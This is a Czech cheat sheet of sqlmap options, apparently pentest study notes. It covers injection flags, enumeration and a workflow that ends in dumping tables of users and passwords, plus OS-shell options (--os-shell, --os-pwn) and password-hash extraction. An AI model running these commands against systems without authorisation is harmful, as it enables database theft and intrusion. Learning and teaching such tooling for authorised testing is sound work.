
| -u  | url     |
| --- | ------- |
| -v  | Verbose |
|     |         |
# Request

| --data         | Data přes post (id=1)                              |
| -------------- | -------------------------------------------------- |
| --random-agent | Use randomly selected HTTP User-Agent header value |
# Injection a detekce

| -p TESTPARAMETER | Testable parameter(s)                      |
| ---------------- | ------------------------------------------ |
| --level=LEVEL    | Level of tests to perform (1-5, default 1) |
| --risk=RISK      | Risk of tests to perform (1-3, default 1)  |
# Techniky
--technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

# Enumerace
--dbs zjisti jaké databáze existují 
-D vyber konkrétní databázi
--tables zjisti jaké tabulky jsou v databázi 
-T vyber konkrétní tabulku 
--dump vypsej obsah tabulky

# Operační systém  
   --os-shell          Prompt for an interactive operating system shell  
   --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
# Shrnutí
## Základní test - najdi zranitelnost
`sqlmap -u "http://server/login" --data="username=admin&password=heslo"`

## Zjisti databáze
`sqlmap -u "..." --data="..." --dbs`

## Zjisti tabulky v konkrétní databázi
`sqlmap -u "..." --data="..." -D nazev_db --tables`

## Zjisti sloupce v konkrétní tabulce
`sqlmap -u "..." --data="..." -D nazev_db -T nazev_tabulky --columns`

## Vypsej obsah tabulky (hesla, uživatelé atd.)
sqlmap -u "..." --data="..." -D nazev_db -T nazev_tabulky --dump
```

## Postup v praxi
```
--dbs → -D databaze --tables → -T tabulka --columns → --dump
```

Tedy od největšího k nejmenšímu – databáze → tabulky → sloupce → obsah.

## Co ostatní dělá
```
--banner      ← verze databáze (MySQL 8.0 atd.)
--passwords   ← hashe hesel adminů databáze
--schema      ← celá struktura najednou
--dump-all    ← vše z celé databáze najednou (hodně dat)
-a            ← úplně vše, používej opatrně